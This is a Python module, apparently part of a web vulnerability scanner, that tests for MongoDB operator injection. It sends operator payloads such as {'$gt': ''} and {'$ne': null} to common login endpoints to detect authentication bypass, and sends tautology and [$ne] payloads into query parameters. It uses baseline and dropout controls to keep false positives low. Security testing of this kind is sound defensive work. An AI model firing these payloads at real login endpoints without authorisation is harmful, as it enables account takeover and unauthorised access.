"""NoSQL (MongoDB-operator) injection probe (vuln phase, non-destructive).

Node/Mongo apps (Juice Shop, countless Express+Mongoose stacks) build queries
straight from request bodies, so a `{"$gt": ""}` or `{"$ne": null}` in place of
a credential turns the WHERE into "match anything" — an auth bypass that never
touches a single `'`. This probe has two modes:

  (1) login / auth bypass — POST operator-injection JSON to common login
      endpoints and confirm a bypass ONLY when a bogus-credential baseline does
      NOT yield a token but the operator payload yields a 200 carrying a
      token / JWT (mirrors login_sqli's baseline discipline to keep FPs low).

  (2) query params — for a URL carrying parameters, replace a value with a
      `[$ne]=` / boolean-tautology payload and flag a response that diverges
      from a benign baseline in a way the tautology should produce.

Detection only — any recovered session is never used. GET/benign POST payloads
only; nothing mutates server state. Runs in the vuln phase (fires without --go).
"""

from __future__ import annotations

import json
import logging
import re
import urllib.parse
from typing import List, Optional
from urllib.parse import urlsplit

from core.swarm_engine import SwarmAgent
from core.swarm_workers import register_worker

from ._http import HttpResp, add_query, fetch, normalize_target_url

logger = logging.getLogger("viper.swarm_workers.vuln.nosql_injection")

TECHNIQUE = "nosql_injection"

# Root-relative login endpoints, REST and classic.
_LOGIN_PATHS = [
    "/rest/user/login", "/api/login", "/api/auth/login", "/api/v1/login",
    "/login", "/auth/login", "/user/login", "/account/login", "/signin",
]

# Operator-injection login bodies. Each value is a dict whose JSON-encoded form
# carries a Mongo operator; a vulnerable query treats it as "match anything".
_OP_BODIES = [
    {"$gt": ""},
    {"$ne": None},
    {"$ne": ""},
    {"$gt": None},
]

# Query-string payloads: bracketed operator + a boolean tautology.
_QUERY_PAYLOADS = ["[$ne]=", "'||'1'=='1", '"||"1"=="1', "[$gt]="]

# A JWT (header.payload.signature) signals a live session unambiguously.
_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}")
# A token-shaped JSON field carrying a real VALUE — a non-empty token-like
# string of >=16 chars. We deliberately require the VALUE, never a bare key
# name: a benign validation/error envelope routinely contains keys like
# "authentication" or "token" with a human-readable message ("failed", null,
# or a short CSRF nonce), and a key alone proves no session was issued.
_TOKEN_VALUE_RE = re.compile(
    r'"(?:token|access_token|auth_token|jwt|id_token|session|sessionid|'
    r'session_token|bearer)"\s*:\s*"([A-Za-z0-9._\-+/=]{16,})"',
    re.I)
# A Set-Cookie issuing a real session value is also a live-session signal.
_SET_COOKIE_SESSION_RE = re.compile(
    r'(?:^|;|,|\s)(?:session|sessionid|sid|connect\.sid|jwt|token|auth)[^=;]*='
    r'[A-Za-z0-9._\-+/%]{16,}', re.I)


def _origin(url: str) -> str:
    p = urlsplit(url)
    return f"{p.scheme}://{p.netloc}" if p.netloc else url.rstrip("/")


def _has_token(resp: Optional[HttpResp]) -> bool:
    """True only when a response carries a REAL session credential.

    Accept a JWT anywhere in the body, a token-shaped JSON field whose VALUE is
    a non-empty token-like string (>=16 chars), or a Set-Cookie issuing a real
    session value. A bare key name (e.g. {"authentication": "failed"}) is NOT a
    token — that's the validation-error envelope that produced the audited FP.
    """
    if not resp or resp.status != 200:
        return False
    if resp.body:
        if _JWT_RE.search(resp.body) or _TOKEN_VALUE_RE.search(resp.body):
            return True
    cookie = (resp.headers or {}).get("set-cookie", "") if resp.headers else ""
    if cookie and _SET_COOKIE_SESSION_RE.search(cookie):
        return True
    return False


async def _post_json(url: str, body_obj: dict, *, timeout: float) -> Optional[HttpResp]:
    body = json.dumps(body_obj).encode()
    return await fetch("POST", url, headers={"Content-Type": "application/json"},
                       body=body, timeout=timeout, follow_redirects=False)


async def _probe_login(origin: str, timeout: float) -> List[dict]:
    """Mode (1): operator-injection auth bypass against common login paths."""
    findings: list[dict] = []
    for path in _LOGIN_PATHS:
        login_url = origin + path
        # Baseline: a wrong credential must NOT return a token, else the endpoint
        # hands tokens to anyone and a token is no injection signal.
        baseline = await _post_json(
            login_url,
            {"email": "no_such_user_7c12@example.com", "password": "wrongpass_7c12"},
            timeout=timeout)
        if baseline is None or baseline.status >= 500:
            continue
        if _has_token(baseline):
            continue
        for op in _OP_BODIES:
            payload_obj = {"email": op, "password": op}
            resp = await _post_json(login_url, payload_obj, timeout=timeout)
            if _has_token(resp):
                payload_str = json.dumps(payload_obj)
                findings.append({
                    "type": "auth_bypass_confirmed",
                    "vuln_type": "nosql_injection:login",
                    "title": f"NoSQL operator-injection auth bypass at {path}",
                    "severity": "critical",
                    "url": login_url,
                    "parameter": "email",
                    "payload": payload_str,
                    "cwe": "CWE-943",
                    "confidence": 0.92,
                    "foothold": True,
                    "evidence": (
                        f"JSON login with operator body {payload_str} returned a "
                        "200 carrying a session token while a bogus credential "
                        "did not — the credential comparison is operator-injectable"
                    ),
                    "poc_request": f"POST {login_url} (json) {payload_str}",
                })
                return findings  # one confirmed bypass is enough
    return findings


def _params(url: str) -> List[str]:
    return list(urllib.parse.parse_qsl(urlsplit(url).query))


def _resp_signature(resp: Optional[HttpResp]) -> Optional[tuple]:
    if resp is None:
        return None
    return (resp.status, len(resp.body or ""))


_RECORD_RE = re.compile(r'\{[^{}]*"[A-Za-z_][\w-]*"\s*:')


def _record_count(body: str) -> int:
    """Rough count of record-shaped JSON objects (``{"key":``) in a body.

    Used as an injection co-signal: a genuine NoSQL operator that makes a query
    match every row returns MORE records than a non-matching baseline. This is
    structure-based, so it ignores HTML template chrome whose byte size has
    nothing to do with how many rows the query matched.
    """
    if not body:
        return 0
    return len(_RECORD_RE.findall(body))


def _drop_param(url: str, key: str) -> str:
    """Return `url` with parameter `key` REMOVED entirely (control request).

    A request with the key gone models "empty / missing query". On a benign
    search/listing page that means browse-all, which looks identical to a
    successful operator injection but has nothing to do with NoSQL - this is the
    control that lets us tell the two apart.
    """
    p = urlsplit(url)
    raw_q = [(k, v) for (k, v) in urllib.parse.parse_qsl(p.query) if k != key]
    new_q = urllib.parse.urlencode(raw_q)
    return urllib.parse.urlunsplit((p.scheme, p.netloc, p.path, new_q, p.fragment))


def _looks_like_dropout(sig: tuple, dropout_sig: Optional[tuple]) -> bool:
    """True if `sig` is explained by param-dropout (empty-query browse-all).

    The payload's divergence is NOT injection if removing the key entirely
    produces the same kind of response: the same status and a body within a
    small tolerance of the dropout body (the operator-bracket key also drops the
    real param under a strict parser, so the two requests are equivalent).
    """
    if dropout_sig is None:
        return False
    if sig[0] != dropout_sig[0]:
        return False
    larger = max(sig[1], dropout_sig[1]) or 1
    # Within ~15% of the browse-all body == attributable to dropout, not a query
    # that newly started matching rows.
    return abs(sig[1] - dropout_sig[1]) <= 0.15 * larger


async def _probe_query(url: str, timeout: float) -> List[dict]:
    """Mode (2): operator/tautology in query params, detect divergence."""
    params = _params(url)
    if not params:
        return []
    findings: list[dict] = []
    # Benign baseline: the URL with an obviously-false sentinel value, so the
    # tautology payload must diverge FROM a non-matching state to be a signal.
    for key, _orig in params:
        false_url = add_query(url, key, "viper_nomatch_7c12")
        baseline = await fetch("GET", false_url, timeout=timeout)
        base_sig = _resp_signature(baseline)
        if base_sig is None or base_sig[0] >= 500:
            continue
        # Param-dropout control: the SAME URL with this key removed entirely
        # ("empty / missing query"). On a benign search page that yields the
        # full catalog (browse-all) - which is indistinguishable from a
        # successful injection by status/size alone. The operator-bracket
        # payload (key[$ne]=) ALSO drops the real key under every strict query
        # parser, so any divergence it produces that merely reproduces this
        # control is dropout, not NoSQL injection. We only flag divergence that
        # the dropout control does NOT explain.
        dropout_resp = await fetch("GET", _drop_param(url, key), timeout=timeout)
        dropout_sig = _resp_signature(dropout_resp)
        for payload in _QUERY_PAYLOADS:
            # `[$ne]=` injects an operator on the key itself (key[$ne]=x); the
            # tautology payloads inject into the value.
            if payload.startswith("["):
                p = urlsplit(url)
                raw_q = urllib.parse.parse_qsl(p.query)
                raw_q = [(k, v) for (k, v) in raw_q if k != key]
                raw_q.append((f"{key}{payload.rstrip('=')}", "viper_nomatch_7c12"))
                new_q = urllib.parse.urlencode(raw_q, safe="[]$")
                inj_url = urllib.parse.urlunsplit(
                    (p.scheme, p.netloc, p.path, new_q, p.fragment))
            else:
                inj_url = add_query(url, key, payload)
            resp = await fetch("GET", inj_url, timeout=timeout)
            sig = _resp_signature(resp)
            if sig is None or sig[0] >= 500:
                continue
            # A successful operator/tautology injection makes the false-baseline
            # query start matching: a 2xx where the baseline was 4xx, or a clear
            # body-size jump on the same status.
            status_flip = sig[0] < 400 <= base_sig[0]
            size_jump = (
                sig[0] == base_sig[0] and sig[1] > base_sig[1] * 2 and sig[1] > 256
            )
            diverged = status_flip or size_jump
            # Suppress param-dropout / empty-query browse-all: if removing the
            # key entirely reproduces this same divergence, the body grew because
            # the app browses-all on an empty query, NOT because a Mongo operator
            # was interpreted. (The operator-bracket key drops the real param
            # under a strict parser, so it is equivalent to the dropout control.)
            if diverged and _looks_like_dropout(sig, dropout_sig):
                continue
            # A bare same-status body-size ratio on an HTML response with no
            # JSON/array structure is dominated by template chrome unrelated to
            # query matching - too weak to report on its own. Require either a
            # status flip, or some record-shaped structure (JSON / array) in the
            # payload response that the false-value baseline lacked.
            if diverged and not status_flip:
                ctype = ((resp.headers or {}).get("content-type", "")
                         if resp and resp.headers else "")
                body = (resp.body or "") if resp else ""
                base_body = (baseline.body or "") if baseline else ""
                has_structure = ("json" in ctype.lower()) or (
                    _record_count(body) > _record_count(base_body))
                if "html" in ctype.lower() and not has_structure:
                    continue
            if diverged:
                findings.append({
                    "type": "nosql_injection_param",
                    "vuln_type": "nosql_injection:query",
                    "title": f"NoSQL injection in query parameter '{key}'",
                    "severity": "high",
                    "url": inj_url,
                    "parameter": key,
                    "payload": payload,
                    "cwe": "CWE-943",
                    "confidence": 0.7,
                    "evidence": (
                        f"operator/tautology payload {payload!r} on '{key}' "
                        f"changed the response (baseline {base_sig[0]}/"
                        f"{base_sig[1]}B → {sig[0]}/{sig[1]}B), matching where a "
                        "non-existent value did not"
                    ),
                    "poc_request": f"GET {inj_url}",
                })
                return findings
    return findings


async def run(agent: SwarmAgent) -> List[dict]:
    url = normalize_target_url(agent.target)
    if not url:
        return []
    origin = _origin(url)
    timeout = min(agent.timeout_s, 8.0)

    findings = await _probe_login(origin, timeout)
    if findings:
        return findings
    return await _probe_query(url, timeout)


register_worker("vuln", TECHNIQUE, run)